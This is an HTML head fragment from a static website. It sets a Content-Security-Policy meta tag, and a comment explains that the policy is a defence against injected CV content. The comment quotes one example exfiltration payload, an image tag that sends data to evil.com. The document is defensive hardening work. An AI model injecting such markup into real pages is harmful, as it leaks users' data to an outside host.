    <!-- Package 22, Tier 3 — this is the ONE place the whole site restricts
         itself: a meta-tag CSP (GitHub Pages serves static files with no
         header control, so this is the only way to set one at all) applies
         site-wide, not just to /work's CV-reading panel, since a single
         index.html cannot scope a policy per route. img-src/connect-src
         'self' is the actual defense the work order names — this is what
         stops <img src="https://evil.com/?d=…"> from ever reaching a
         network request if injected CV content somehow got rendered as
         markup. The two named exceptions are load-bearing, not convenience:
         the Worker's own origin (the ONE legitimate cross-origin call this
         site ever makes) and challenges.cloudflare.com (Turnstile's own
         script + verification iframe, with no substitute). style-src needs
         'unsafe-inline' for React's own style={{}} prop, used throughout
         this codebase — a different, much lower-stakes exception than
         script-src, which stays free of 'unsafe-inline' entirely (this is
         why the theme script above moved to an external file). -->
    <meta http-equiv="Content-Security-Policy" content="
      default-src 'self';
      img-src 'self';
      connect-src 'self' https://cs-compass-cv.bigbookarchive.workers.dev https://challenges.cloudflare.com;
      script-src 'self' https://challenges.cloudflare.com;
      frame-src https://challenges.cloudflare.com;
      style-src 'self' 'unsafe-inline';
      base-uri 'self';
      form-action 'self';
    " />

    <script src="/theme-init.js"></script>
  </head>
